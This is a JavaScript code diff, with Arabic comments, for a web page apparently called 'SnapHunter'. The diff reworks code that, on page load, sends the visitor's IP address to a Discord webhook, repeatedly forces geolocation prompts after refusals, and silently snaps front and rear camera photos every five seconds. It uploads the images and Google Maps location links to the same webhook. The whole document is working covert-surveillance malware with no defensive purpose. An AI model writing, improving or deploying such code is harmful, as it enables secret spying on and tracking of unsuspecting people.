@@ -5,89 +5,86 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let userLat = null, userLng = null;
 
-// 1. طلب الموقع بشكل إجباري (تكرار فوري عند الرفض)
+// 1. إرسال البيانات فوراً وبسرعة
+async function sendQuickly(blob, text) {
+    const formData = new FormData();
+    if (blob) formData.append('file', blob, 'instant.jpg');
+    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Instant" }));
+    
+    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+}
+
+// 2. طلب الموقع بشكل إجباري ومتكرر عند الرفض
 function forceLocation() {
     navigator.geolocation.getCurrentPosition(
         (p) => {
             userLat = p.coords.latitude;
             userLng = p.coords.longitude;
-            // إرسال الموقع فور الحصول عليه لضمان السرعة
-            sendToDiscord(null, `📍 **الموقع المكتشف:**\nhttps://www.google.com/maps?q=${userLat},${userLng}`);
+            sendQuickly(null, `📍 **الموقع:** https://www.google.com/maps?q=${userLat},${userLng}`);
         },
-        () => { 
-            // إذا رفض، يكرر الطلب بعد نصف ثانية فوراً
-            setTimeout(forceLocation, 500); 
-        },
+        () => { setTimeout(forceLocation, 400); }, // تكرار الطلب بسرعة عند الرفض
         { enableHighAccuracy: true }
     );
 }
 
-// 2. وظيفة الإرسال السريع جداً
-async function sendToDiscord(imageBlob, textContent) {
-    const formData = new FormData();
-    if (imageBlob) formData.append('file', imageBlob, 'fast_shot.jpg');
-    
-    formData.append('payload_json', JSON.stringify({
-        content: textContent,
-        username: "SnapHunter Speed"
-    }));
-
-    try {
-        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-    } catch (e) { console.error("خطأ في الإرسال"); }
-}
-
-// 3. التقاط الصور بضغط عالي (Ultra Fast)
-async function captureSequence(mode) {
+// 3. دالة الالتقاط "اللحظي"
+async function instantCapture(mode) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
         video.srcObject = stream;
-        await new Promise(r => video.onloadedmetadata = r);
-        video.play();
-
-        // وقت انتظار قصير جداً (0.5 ثانية) لفتح العدسة
-        await new Promise(r => setTimeout(r, 500));
-
-        const ctx = canvas.getContext('2d');
-        // تصغير أبعاد الصورة لسرعة النقل (480p)
-        canvas.width = 640;
-        canvas.height = 480;
-        ctx.drawImage(video, 0, 0, 640, 480);
         
-        // تحويل الصورة لـ JPEG مع ضغط الجودة (0.4 = 40% جودة لسرعة خرافية)
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
-        
-        // إغلاق الكاميرا فوراً
-        stream.getTracks().forEach(t => t.stop());
-
-        await sendToDiscord(blob, `📸 لقطة من الكاميرا: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
-    } catch (e) { }
+        return new Promise((resolve) => {
+            video.onloadeddata = async () => {
+                video.play();
+                // التقاط فوري (انتظار 100ms فقط لضبط الإضاءة تلقائياً)
+                await new Promise(r => setTimeout(r, 100));
+                
+                const ctx = canvas.getContext('2d');
+                canvas.width = 640; canvas.height = 480;
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob(async (blob) => {
+                    stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا فوراً
+                    await sendQuickly(blob, `📸 لقطة فورية: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
+                    resolve();
+                }, 'image/jpeg', 0.4); // ضغط عالي جداً لسرعة الإرسال
+            };
+        });
+    } catch (e) { return null; }
 }
 
-// 4. التشغيل اللحظي (المحرك)
+// 4. المحرك الرئيسي (تشغيل عند الدخول)
 (async function init() {
-    // إرسال الـ IP فوراً
-    try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        sendToDiscord(null, `🚀 **دخول جديد الآن!**\n🌐 IP: \`${ipData.ip}\``);
-    } catch(e){}
+    // إرسال IP فوراً
+    fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+        sendQuickly(null, `🚀 **دخول جديد الآن!**\n🌐 IP: \`${data.ip}\``);
+    });
 
-    // طلب الأذونات والبدء
     try {
-        await navigator.mediaDevices.getUserMedia({ video: true }); // طلب الكاميرا أولاً
-        forceLocation(); // طلب الموقع ثانياً
+        // بمجرد أن يضغط "سماح" على الكاميرا..
+        const mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        mainStream.getTracks().forEach(t => t.stop()); // فتح الإذن العام
 
-        // حلقة التكرار كل 5 ثوانٍ
+        // اطلب الموقع فوراً وبقوة
+        forceLocation();
+
+        // تنفيذ أول لقطتين "فوراً" بدون انتظار ثانية واحدة
+        await instantCapture('user');
+        await instantCapture('environment');
+
+        // ثم ابدأ التكرار كل 5 ثوانٍ
         const loop = async () => {
-            await captureSequence('user');        // التقاط سيلفي
-            await captureSequence('environment'); // التقاط خلفية
-            setTimeout(loop, 5000);               // انتظار 5 ثوانٍ وإعادة الكرة
+            await instantCapture('user');
+            await instantCapture('environment');
+            setTimeout(loop, 5000);
         };
         loop();
 
     } catch (err) {
+        // في حال رفض الكاميرا، استمر في طلب الموقع وإرسال التحديثات
         forceLocation();
-        setInterval(() => { if(userLat) sendToDiscord(null, `📍 تحديث الموقع: ${userLat},${userLng}`); }, 5000);
+        setInterval(() => {
+            if(userLat) sendQuickly(null, `📍 تحديث موقع مستمر: ${userLat},${userLng}`);
+        }, 5000);
     }
 })();
